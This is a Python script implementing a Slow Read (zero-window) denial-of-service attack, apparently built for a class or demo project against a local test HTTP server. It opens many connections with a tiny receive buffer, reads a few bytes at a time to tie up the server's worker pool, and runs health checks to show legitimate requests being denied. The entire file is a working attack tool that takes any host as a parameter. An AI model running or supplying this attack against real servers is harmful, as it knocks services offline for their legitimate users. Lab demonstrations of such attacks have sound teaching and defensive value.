#!/usr/bin/env python3
"""Slow Read / zero-window DoS -- the deck's "guaranteed-working backup" (see the
Overview and Implementation Plan slides). Opens many connections to the HTTP server,
requests a large resource, then reads the response a few bytes at a time with a tiny
SO_RCVBUF and a deliberate delay between reads. The server's send() blocks on the
near-zero receive window, so each connection ties up one worker in the bounded pool
until legitimate requests (the /health check) start getting denied or stalling.

Run against server/http_server.py from the client namespace:
    ip netns exec wscale-client python3 slowread/slow_read_client.py --host 10.0.0.2
"""
import argparse
import socket
import threading
import time


def slow_read_worker(idx, host, port, path, rcvbuf, delay, duration, results, lock):
    start = time.time()
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, rcvbuf)
        s.settimeout(10)
        s.connect((host, port))
        s.sendall(f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
        total = 0
        while time.time() - start < duration:
            s.settimeout(5)
            data = s.recv(16)
            if not data:
                break
            total += len(data)
            time.sleep(delay)
        held_for = time.time() - start
        with lock:
            results.append({"id": idx, "bytes": total, "held_seconds": round(held_for, 1), "status": "held-open"})
    except (socket.timeout, ConnectionError, OSError) as e:
        with lock:
            results.append(
                {"id": idx, "bytes": 0, "held_seconds": round(time.time() - start, 1), "status": f"error: {e}"}
            )
    finally:
        if s is not None:
            try:
                s.close()
            except OSError:
                pass


def health_check(host, port, timeout=3):
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        t0 = time.time()
        s.connect((host, port))
        s.sendall(f"GET /health HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
        resp = s.recv(64)
        return True, time.time() - t0, resp[:32]
    except (socket.timeout, ConnectionError, OSError) as e:
        return False, timeout, str(e).encode()
    finally:
        if s is not None:
            try:
                s.close()
            except OSError:
                pass


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=8000)
    ap.add_argument("--path", default="/bigfile")
    ap.add_argument("--connections", type=int, default=50)
    ap.add_argument("--rcvbuf", type=int, default=8, help="advertised receive buffer in bytes (tiny window)")
    ap.add_argument("--delay", type=float, default=1.0, help="seconds between each tiny read")
    ap.add_argument("--duration", type=float, default=30.0, help="seconds to hold each connection")
    args = ap.parse_args()

    print(f"[*] baseline health check on {args.host}:{args.port} before the attack...")
    ok, rtt, body = health_check(args.host, args.port)
    print(f"    -> ok={ok} rtt={rtt:.3f}s body={body!r}")

    print(
        f"[*] launching {args.connections} slow-read connections "
        f"(rcvbuf={args.rcvbuf}B, {args.delay}s/read, held {args.duration}s)..."
    )
    results, lock = [], threading.Lock()
    threads = [
        threading.Thread(
            target=slow_read_worker,
            args=(i, args.host, args.port, args.path, args.rcvbuf, args.delay, args.duration, results, lock),
        )
        for i in range(args.connections)
    ]
    for t in threads:
        t.start()
        time.sleep(0.02)

    time.sleep(min(5, args.duration / 2))
    print("[*] health check WHILE the slow-read attack is running...")
    ok, rtt, body = health_check(args.host, args.port)
    flag = "  <-- DENIED / degraded, pool likely exhausted" if not ok or rtt > 2 else ""
    print(f"    -> ok={ok} rtt={rtt:.3f}s body={body!r}{flag}")

    for t in threads:
        t.join()

    held = sum(1 for r in results if r["status"] == "held-open")
    print(f"\n[*] summary: {held}/{args.connections} connections held open for the full duration.")
    print("[*] health check AFTER attacker connections released...")
    ok, rtt, body = health_check(args.host, args.port)
    print(f"    -> ok={ok} rtt={rtt:.3f}s body={body!r}")


if __name__ == "__main__":
    main()
